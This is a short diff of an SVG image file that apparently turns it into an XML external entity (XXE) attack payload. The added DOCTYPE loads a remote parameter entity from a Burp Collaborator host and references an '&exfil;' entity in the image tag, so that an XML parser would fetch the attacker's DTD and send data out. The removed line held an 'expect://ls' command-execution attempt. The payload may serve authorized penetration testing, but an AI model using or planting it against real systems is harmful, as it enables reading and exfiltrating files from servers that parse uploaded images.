@@ -1,5 +1,10 @@
 <?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY % sp SYSTEM "http://wzz28htiai8bra57yoinkuw0grmic61.burpcollaborator.net">
+%sp;
+%param1;
+]>
 <svg xmlns="http://www.w3.org/2000/svg">
-  <image xlink:href="expect://ls" width="200" height="200"></image>
+  <image xlink:href="&exfil;" width="200" height="200"></image>
 </svg>
